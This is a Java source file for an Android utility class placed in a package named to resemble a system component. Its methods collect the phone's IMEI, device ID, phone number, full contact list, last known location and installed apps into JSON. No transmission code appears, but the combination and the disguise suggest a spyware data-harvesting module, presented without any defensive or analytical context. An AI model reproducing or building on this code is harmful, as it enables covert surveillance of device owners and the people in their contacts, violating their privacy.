package com.android.systemcore.utils;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.util.List;

public class DeviceInfo {

    private static final String TAG = "DeviceInfo";

    public static String getDeviceId(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager != null) {
                return telephonyManager.getDeviceId();
            }
        } catch (SecurityException e) {
            e.printStackTrace();
        }
        return "unknown";
    }

    public static String getPhoneNumber(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager != null) {
                String phoneNumber = telephonyManager.getLine1Number();
                if (phoneNumber != null && !phoneNumber.isEmpty()) {
                    return phoneNumber;
                }
            }
        } catch (SecurityException e) {
            e.printStackTrace();
        }
        return "unknown";
    }

    public static String getIMEI(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    return telephonyManager.getImei();
                } else {
                    return telephonyManager.getDeviceId();
                }
            }
        } catch (SecurityException e) {
            e.printStackTrace();
        }
        return "unknown";
    }

    public static JSONObject getInstalledApps(Context context) {
        JSONObject appsData = new JSONObject();
        JSONArray appsList = new JSONArray();
        try {
            PackageManager packageManager = context.getPackageManager();
            List<ApplicationInfo> apps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
            
            for (ApplicationInfo app : apps) {
                JSONObject appInfo = new JSONObject();
                appInfo.put("packageName", app.packageName);
                appInfo.put("name", packageManager.getApplicationLabel(app).toString());
                appInfo.put("enabled", app.enabled);
                appsList.put(appInfo);
            }
            appsData.put("apps", appsList);
            appsData.put("count", appsList.length());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return appsData;
    }

    public static JSONObject getContactList(Context context) {
        JSONObject contactsData = new JSONObject();
        JSONArray contactsList = new JSONArray();
        try {
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contact.put("name", name);
                    contact.put("phone", phoneNumber);
                    contactsList.put(contact);
                }
                cursor.close();
            }
            contactsData.put("contacts", contactsList);
            contactsData.put("count", contactsList.length());
        } catch (SecurityException | JSONException e) {
            e.printStackTrace();
        }
        return contactsData;
    }

    public static JSONObject getLocationData(Context context) {
        JSONObject locationData = new JSONObject();
        try {
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            if (locationManager != null) {
                Location lastKnownLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (lastKnownLocation == null) {
                    lastKnownLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }
                
                if (lastKnownLocation != null) {
                    locationData.put("latitude", lastKnownLocation.getLatitude());
                    locationData.put("longitude", lastKnownLocation.getLongitude());
                    locationData.put("accuracy", lastKnownLocation.getAccuracy());
                    locationData.put("timestamp", lastKnownLocation.getTime());
                } else {
                    locationData.put("latitude", 0.0);
                    locationData.put("longitude", 0.0);
                    locationData.put("status", "unavailable");
                }
            }
        } catch (SecurityException | JSONException e) {
            e.printStackTrace();
        }
        return locationData;
    }

    public static JSONObject getAllDeviceInfo(Context context) {
        JSONObject deviceData = new JSONObject();
        try {
            deviceData.put("deviceId", getDeviceId(context));
            deviceData.put("phoneNumber", getPhoneNumber(context));
            deviceData.put("imei", getIMEI(context));
            deviceData.put("model", Build.MODEL);
            deviceData.put("manufacturer", Build.MANUFACTURER);
            deviceData.put("androidVersion", Build.VERSION.RELEASE);
            deviceData.put("sdkVersion", Build.VERSION.SDK_INT);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return deviceData;
    }
}